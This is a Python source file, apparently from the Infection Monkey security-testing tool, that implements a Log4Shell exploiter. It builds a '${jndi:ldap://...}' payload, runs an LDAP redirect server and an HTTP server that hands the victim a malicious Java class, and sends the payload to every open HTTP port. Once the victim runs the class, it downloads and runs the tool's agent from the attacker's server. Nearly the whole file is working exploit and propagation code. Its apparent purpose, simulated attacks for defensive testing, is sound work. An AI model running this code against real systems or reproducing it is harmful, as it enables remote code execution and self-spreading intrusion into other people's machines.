import http.client
import http.server
import logging
from threading import Thread
from time import sleep

from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.log4shell_utils import (
    LINUX_EXPLOIT_TEMPLATE_PATH,
    WINDOWS_EXPLOIT_TEMPLATE_PATH,
    LDAPExploitServer,
    build_exploit_bytecode,
    get_log4shell_service_exploiters,
)
from infection_monkey.exploit.tools.helpers import get_monkey_depth
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.web_rce import WebRCE
from infection_monkey.model import (
    LOG4SHELL_LINUX_COMMAND,
    LOG4SHELL_WINDOWS_COMMAND,
    MONKEY_ARG,
    VictimHost,
)
from infection_monkey.network.info import get_free_tcp_port
from infection_monkey.network.tools import get_interface_to_target
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.monkey_dir import get_monkey_dir_path

logger = logging.getLogger(__name__)


class Log4ShellExploiter(WebRCE):
    _TARGET_OS_TYPE = ["linux", "windows"]
    EXPLOIT_TYPE = ExploitType.VULNERABILITY
    _EXPLOITED_SERVICE = "Log4j"
    DOWNLOAD_TIMEOUT = 15
    REQUEST_TO_VICTIM_TIME = 5  # How long the request from victim to monkey might take. In seconds

    def __init__(self, host: VictimHost):
        super().__init__(host)
        self._client = None
        self.ldap_port = get_free_tcp_port()
        self.class_http_server_port = get_free_tcp_port()

        self.ldap_server_thread = None
        self.ldap_server = None
        self.agent_http_server_thread = None
        self.java_class_http_server_thread = None

    def _exploit_host(self):
        self.start_servers()
        try:
            return self.exploit(None, None)
        finally:
            self.stop_servers()

    def start_servers(self):
        # Start http server, to serve agent to victims
        paths = self.get_monkey_paths()
        agent_http_path = self.start_agent_http_server(paths)

        # Build agent execution command
        command = self.build_command(paths["dest_path"], agent_http_path)

        # Start http server to serve malicious java class to victim
        class_server_ip = self.start_class_http_server(command)
        # Start ldap server to redirect ldap query to java class server
        self.start_ldap_server(class_server_ip)

    def start_agent_http_server(self, agent_paths: dict) -> str:
        # Create server for http download and wait for it's startup.
        http_path, http_thread = HTTPTools.create_locked_transfer(
            self.host, agent_paths["src_path"]
        )
        self.agent_http_server_thread = http_thread
        if not http_path:
            logger.debug("Exploiter failed, couldn't start an http server to serve agent.")
            raise Exception("Http server creation failed")
        logger.info("Started http server on %s", http_path)
        return http_path

    def start_class_http_server(self, command: str) -> str:
        java_class = self.build_java_class(command)
        class_http_server_ip = get_interface_to_target(self.host.ip_addr)

        java_class_http_thread = self.get_java_class_server_thread(class_http_server_ip, java_class)
        self.java_class_http_server_thread = java_class_http_thread
        self.java_class_http_server_thread.start()
        return class_http_server_ip

    def start_ldap_server(self, class_http_server_ip: str):
        self.ldap_server = LDAPExploitServer(
            ldap_server_port=self.ldap_port,
            http_server_ip=class_http_server_ip,
            http_server_port=self.class_http_server_port,
            storage_dir=get_monkey_dir_path(),
        )
        ldap_thread = self.ldap_server.get_run_thread()
        self.ldap_server_thread = ldap_thread
        self.ldap_server_thread.start()

    def stop_servers(self):
        self.agent_http_server_thread.join(Log4ShellExploiter.DOWNLOAD_TIMEOUT)
        self.agent_http_server_thread.stop()

        self.java_class_http_server_thread.join(Log4ShellExploiter.DOWNLOAD_TIMEOUT)
        Log4ShellExploiter.HTTPHandler.stop = True

        self.ldap_server_thread.join(Log4ShellExploiter.DOWNLOAD_TIMEOUT)
        self.ldap_server.stop()

    def build_ldap_payload(self):
        interface_ip = get_interface_to_target(self.host.ip_addr)
        return f"${{jndi:ldap://{interface_ip}:{self.ldap_port}/dn=Exploit}}"

    # TODO remove duplication with infection_monkey.exploit.hadoop.HadoopExploiter.build_command
    def build_command(self, path, http_path):
        # Build command to execute
        monkey_cmd = build_monkey_commandline(
            self.host, get_monkey_depth() - 1, vulnerable_port=None
        )
        if "linux" in self.host.os["type"]:
            base_command = LOG4SHELL_LINUX_COMMAND
        else:
            base_command = LOG4SHELL_WINDOWS_COMMAND

        return base_command % {
            "monkey_path": path,
            "http_path": http_path,
            "monkey_type": MONKEY_ARG,
            "parameters": monkey_cmd,
        }

    def build_java_class(self, exploit_command: str) -> bytes:
        if "linux" in self.host.os["type"]:
            return build_exploit_bytecode(exploit_command, LINUX_EXPLOIT_TEMPLATE_PATH)
        else:
            return build_exploit_bytecode(exploit_command, WINDOWS_EXPLOIT_TEMPLATE_PATH)

    def exploit(self, url, command) -> bool:
        # Try to exploit all services,
        # because we don't know which services are running and on which ports
        open_ports = [
            int(port[0]) for port in WebRCE.get_open_service_ports(self.host, self.HTTP, ["http"])
        ]
        for exploit in get_log4shell_service_exploiters():
            for port in open_ports:
                exploit.trigger_exploit(self.build_ldap_payload(), self.host, port)

                # Wait for request
                sleep(Log4ShellExploiter.REQUEST_TO_VICTIM_TIME)

                if Log4ShellExploiter.HTTPHandler.class_downloaded:
                    self.exploit_info["vulnerable_service"] = {
                        "service_name": exploit.service_name,
                        "port": port,
                    }
                    return True
        return False

    class HTTPHandler(http.server.BaseHTTPRequestHandler):

        java_class: bytes
        class_downloaded = False
        stop = False

        @staticmethod
        def reset():
            Log4ShellExploiter.HTTPHandler.class_downloaded = False
            Log4ShellExploiter.HTTPHandler.stop = False

        def do_GET(self):
            Log4ShellExploiter.HTTPHandler.class_downloaded = True
            logger.info("Java class servergot a GET request!")
            self.send_response(200)
            self.send_header("Content-type", "application/octet-stream")
            self.end_headers()
            logger.info("Sending the payload class!")
            self.wfile.write(self.java_class)

    def _run_class_http_server(self, ip):
        server = http.server.HTTPServer(
            (ip, self.class_http_server_port), Log4ShellExploiter.HTTPHandler
        )
        while (
            not Log4ShellExploiter.HTTPHandler.class_downloaded
            and not Log4ShellExploiter.HTTPHandler.stop
        ):
            server.handle_request()

        Log4ShellExploiter.HTTPHandler.reset()

    def get_java_class_server_thread(self, ip: str, java_class: bytes):
        Log4ShellExploiter.HTTPHandler.java_class = java_class

        return Thread(target=self._run_class_http_server, args=[ip])
